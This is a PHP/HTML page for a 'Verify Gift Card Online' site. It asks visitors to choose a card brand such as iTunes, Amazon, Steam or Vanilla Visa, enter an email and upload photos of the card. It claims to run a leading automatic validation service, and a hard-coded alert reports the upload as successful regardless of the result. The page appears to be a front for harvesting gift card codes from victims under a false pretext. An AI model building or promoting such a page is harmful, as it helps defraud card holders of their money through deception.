<?php 
  
  $page_titles = "My Cards";
  include 'header.php';
  // require_once "dbconnect.php"
 ?>


      <section class="breadcrumbs-custom bg-image context-dark" style="background-image: url(img/allcards.png);">
        <div class="container">
          <h2 class="breadcrumbs-custom-title">Verify Giftcard</h2>
          <div class="breadcrumbs-custom-subtitle"></div>
        </div>
      </section>
      <!-- Branding-->
      <section class="section section-lg bg-default section-lined">
        <div class="container container-custom-width">
          <h3 class="text-center">Verify Gift Card Online</h3>
          <div class="row row-custom-width row-30 row-xxl-100 row-flex">
            <div class="col-sm-6 col-lg-4 wow fadeInRight">
              <div class="project-grid" style="background-image: url(img/allcards.png);">
                <div class="inner">
                  <!-- <h5 class="title"><a href="#">WTC Publishing</a></h5> -->
                  <p class="">Verify gift cards online is a leading gift card checking and validation service provider with a repuation for providing fast and accurate gift card validation service to all of its users. Just proceed to the validation page, Upload the front and back of your giftcard and our system will automatically review its validation and activation.</p>
                  <!-- <a class="button button-light" href="#">View</a> -->
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4 wow fadeInRight" data-wow-delay="0.2s">
              <div class="project-grid" style="background-image: url(img/itunes2.jpg);">
                <div class="inner">
                  <!-- <h5 class="title"><a href="#">RDA Shoewear</a></h5> -->
                  <p class="">Verify gift cards online is a leading gift card checking and validation service provider with a repuation for providing fast and accurate gift card validation service to all of its users. Just proceed to the validation page, Upload the front and back of your giftcard and our system will automatically review its validation and activation.</p>
                  <!-- <a class="button button-light" href="#">View</a> -->
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4 wow fadeInRight" data-wow-delay="0.4s">
              <div class="project-grid" style="background-image: url(img/itunes_bck.jpg);">
                <div class="inner">
                  <!-- <h5 class="title"><a href="#">Inter restaurant</a></h5> -->
                  <p class="">Verify gift cards online is a leading gift card checking and validation service provider with a repuation for providing fast and accurate gift card validation service to all of its users. Just proceed to the validation page, Upload the front and back of your giftcard and our system will automatically review its validation and activation</p>
                  <!-- <a class="button button-light" href="#">View</a> -->
                </div>
              </div>
            </div>
            <!-- <div class="col-sm-6 col-lg-4 wow fadeInRight" data-wow-delay="0.2s">
              <div class="project-grid" style="background-image: url(images/projects-4-518x373.jpg);">
                <div class="inner"><img src="images/projects-logo-250x96.png" alt="" width="250" height="96"/>
                  <h5 class="title"><a href="#">Create Co.</a></h5>
                  <p class="exeption">We design incredibly creative websites for all our customers located worldwide.</p><a class="button button-light" href="#">View</a>
                </div>
              </div>
            </div> -->
            <!-- <div class="col-sm-6 col-lg-4 wow fadeInRight" data-wow-delay="0.4s">
              <div class="project-grid" style="background-image: url(images/projects-5-518x373.jpg);">
                <div class="inner"><img src="images/projects-logo-250x96.png" alt="" width="250" height="96"/>
                  <h5 class="title"><a href="#">iStep Ltd.</a></h5>
                  <p class="exeption">We design incredibly creative websites for all our customers located worldwide.</p><a class="button button-light" href="#">View</a>
                </div>
              </div>
            </div> -->
            <!-- <div class="col-sm-6 col-lg-4 wow fadeInRight" data-wow-delay="0.6s">
              <div class="project-grid" style="background-image: url(images/projects-6-518x373.jpg);">
                <div class="inner"><img src="images/projects-logo-250x96.png" alt="" width="250" height="96"/>
                  <h5 class="title"><a href="#">Architex</a></h5>
                  <p class="exeption">We design incredibly creative websites for all our customers located worldwide.</p><a class="button button-light" href="#">View</a>
                </div>
              </div>
            </div> -->
          </div>
          <!-- <div class="button-wrap-1 text-center"><a class="button button-default" href="#">All projects</a></div> -->
        </div>
      </section>
      <!-- Upload Card-->
      <section class="section section-md bg-default">
        <div class="container">
          <p class="big">Select the gift card name and proceed to upload the front and back of the card</p>
          <!-- RD Mailform-->
          <form class="form-boxed" data-form-output="form-output-global" data-form-type="card_upload" method="post" action="save_file.php" enctype="multipart/form-data">
            <div class="row row-50">
              <div class="col-12">
                <div class="form-wrap form-wrap-icon">
                  <label for="contact-message">Select gift card type</label>
                  <select class="form-control">
                    <option selected>Click to select gift card type</option>
                    <option value="Itunes">Apple Itunes Card</option>
                    <option value="Amazon">Amazon Card</option>
                    <option value="Steam">Steam Wallet Card</option>
                    <option value="Master Card">Master Card</option>
                    <option value="Vanilla">Vanilla</option>
                    <option value="Vanilla Visa">Vanilla Visa</option>
                    <option value="Vanilla Mastercard">Vanilla Mastercard</option>
                    <option value="Walmart Visa">Walmart Visa</option>
                    <option value="TT Visa">TT Visa</option>
                    <option value="Visa Silvery White">Visa Silvery White</option>
                    <option value="Ebay Card">Ebay Card</option>
                    <option value="Footlocker">Footlocker</option>
                    <option value="Nike Card">Nike Card</option>
                    <option value="Amex ">Amex </option>
                    <option value="Visa (The perfect gift)">Visa (The perfect gift)</option>
                    <option value="Nordstrom Card">Nordstrom Card</option>
                    <option value="Sephora Card">Sephora Card</option>
                    <option value="Other">Other</option>
                  </select>
                  <!-- <textarea class="form-input" id="contact-message" name="message" data-constraints="@Required"></textarea> -->
                </div>
              </div>
              <div class="col-lg-12">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-email-outline"></div>
                  <input class="form-input" id="contact-email" type="email" name="email" data-constraints="@Email @Required">
                  <label class="form-label" for="contact-email">E-mail</label>
                </div>
              </div>
              <div class="col-lg-12">
                <div class="form-wrap form-wrap-icon">
                  <!-- <div class="form-icon mdi mdi-account-outline"></div> -->
                  <input class="form-input" id="card_front" type="file" name="card_front" required="required">
                  <label for="card_front">Upload front of card</label>
                </div>
              </div>
              
              
              <div class="col-md-12">
                <div class="button-wrap-1 text-center"><button class="button button-default" name="save" onclick="alert('Card front upload successfully. Proceed to upload back of card')">Check card</button></div>
              </div>
            </div>
          </form>
        </div>
      </section>
      <!-- Team-->
      <!-- <section class="section section-lg bg-default">
        <div class="container">
          <div class="row">
            <div class="col-12">
              <h3 class="text-center">Our Team</h3>
            </div>
          </div>
        </div>
        <div class="container">
          <div class="row row-15 row-gutter-14">
            <div class="col-sm-6 col-lg-4">
              <div class="box-team"><img src="images/team-1-380x332.jpg" alt="" width="380" height="332"/>
                <div class="meta">
                  <div class="heading-6 title">John Smith</div>
                  <p class="position">Senior Designer</p>
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4">
              <div class="box-team"><img src="images/team-2-380x332.jpg" alt="" width="380" height="332"/>
                <div class="meta">
                  <div class="heading-6 title">Ann Clarke</div>
                  <p class="position">Lead Developer</p>
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4">
              <div class="box-team"><img src="images/team-3-380x332.jpg" alt="" width="380" height="332"/>
                <div class="meta">
                  <div class="heading-6 title">Gary Hughes</div>
                  <p class="position">Designer</p>
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4">
              <div class="box-team"><img src="images/team-4-380x332.jpg" alt="" width="380" height="332"/>
                <div class="meta">
                  <div class="heading-6 title">Peter Jones</div>
                  <p class="position">UX Designer</p>
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4">
              <div class="box-team"><img src="images/team-5-380x332.jpg" alt="" width="380" height="332"/>
                <div class="meta">
                  <div class="heading-6 title">Sam Lee</div>
                  <p class="position">Developer</p>
                </div>
              </div>
            </div>
            <div class="col-sm-6 col-lg-4">
              <div class="box-team"><img src="images/team-6-380x332.jpg" alt="" width="380" height="332"/>
                <div class="meta">
                  <div class="heading-6 title">Sarah Parker</div>
                  <p class="position">Marketing manager</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section> -->
      <!-- Our clients-->
      <!-- <section class="section section-lg section-bottom-0 bg-default section-lined">
        <div class="container container-lined">
          <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-4"></div>
            <div class="col-md-4"></div>
          </div>
        </div>
        <div class="container">
          <div class="box-grid-wrap">
            <div class="row no-gutters">
              <div class="col-md-6 col-lg-4">
                <div class="row no-gutters flex-md-column-reverse">
                  <div class="col-md-12">
                    <div class="box-counter-custom">
                      <div class="counter" style="background-image: url(images/bg-image-4.jpg)">19</div>
                      <div class="title">years of experience</div>
                    </div>
                  </div>
                  <div class="col-12">
                    <div class="row no-gutters"><a class="col-6 col-md-6 box-border" href="#"><img src="images/brand-6-108x66.png" alt="" width="108" height="66"/></a><a class="col-6 col-md-6 box-border" href="#"><img src="images/brand-7-168x39.png" alt="" width="168" height="39"/></a></div>
                  </div>
                </div>
              </div>
              <div class="col-md-6 col-lg-4 align-items-start">
                <div class="row no-gutters"><a class="col-6 col-md-6 box-border" href="#"><img src="images/brand-8-119x64.png" alt="" width="119" height="64"/></a><a class="col-6 col-md-6 box-border" href="#"><img src="images/brand-9-140x59.png" alt="" width="140" height="59"/></a><a class="col-6 col-md-6 box-border" href="#"><img src="images/brand-10-154x33.png" alt="" width="154" height="33"/></a><a class="col-6 col-md-6 box-border" href="#"><img src="images/brand-11-122x80.png" alt="" width="122" height="80"/></a><a class="col-12 box-border box-border-1" href="#">
                    <div class="icon icon-sm mdi mdi-arrow-right"></div></a></div>
              </div>
              <div class="col-lg-4 box-wrapper-1">
                <div class="heading-3 title">Our clients</div>
                <p>We work with lots of corporate customers located worldwide.</p>
                <p>Some of our clients became our partners and joined our business loyalty program that allows getting more from our solutions.</p>
                <div class="img-wrap-1"><img src="images/speaker-2-180x70.png" alt="" width="180" height="70"/>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section> -->
      <!-- Branding-->
    <!--   <section class="section section-lg bg-gray-700 text-center text-sm-left">
        <div class="container">
          <div class="row row-40">
            <div class="col-lg-9">
              <div class="row row-30 row-xxl-85">
                <div class="col-sm-6 col-md-4">
                  <h5>Branding</h5>
                  <ul class="list-xs">
                    <li><a class="link-item" href="#">Logo Design</a></li>
                    <li><a class="link-item" href="#">Branding Strategy</a></li>
                    <li><a class="link-item" href="#">Packaging</a></li>
                  </ul>
                </div>
                <div class="col-sm-6 col-md-4">
                  <h5>Marketing</h5>
                  <ul class="list-xs">
                    <li><a class="link-item" href="#">Online Marketing</a></li>
                    <li><a class="link-item" href="#">Email Marketing</a></li>
                    <li><a class="link-item" href="#">SEO</a></li>
                  </ul>
                </div>
                <div class="col-sm-6 col-md-4">
                  <h5>Development</h5>
                  <ul class="list-xs">
                    <li><a class="link-item" href="#">Landing Pages</a></li>
                    <li><a class="link-item" href="#">Websites</a></li>
                    <li><a class="link-item" href="#">Mobile Apps</a></li>
                  </ul>
                </div>
                <div class="col-sm-6 col-md-4">
                  <article class="box-counter">
                    <div class="box-counter-main">
                      <div class="counter">10</div><span class="small small_top">+</span>
                    </div>
                    <div class="box-counter-title">International awards</div>
                  </article>
                </div>
                <div class="col-sm-6 col-md-4">
                  <article class="box-counter">
                    <div class="box-counter-main">
                      <div class="counter">57</div>
                    </div>
                    <div class="box-counter-title">Finished projects</div>
                  </article>
                </div>
                <div class="col-sm-6 col-md-4">
                  <article class="box-counter">
                    <div class="box-counter-main">
                      <div class="counter">19</div><span class="small small_top">+</span>
                    </div>
                    <div class="box-counter-title">Years of experience</div>
                  </article>
                </div>
              </div>
            </div>
            <div class="col-lg-3">
              <div class="heading-3">What we do</div>
              <div class="big">iStudio offers reliable and creative web design and development services.</div>
              <div class="img-wrap-1"><img src="images/speaker-1-180x80.png" alt="" width="180" height="80"/>
              </div>
            </div>
          </div>
        </div>
      </section> -->


<?php 
  include 'footer.php'
 ?>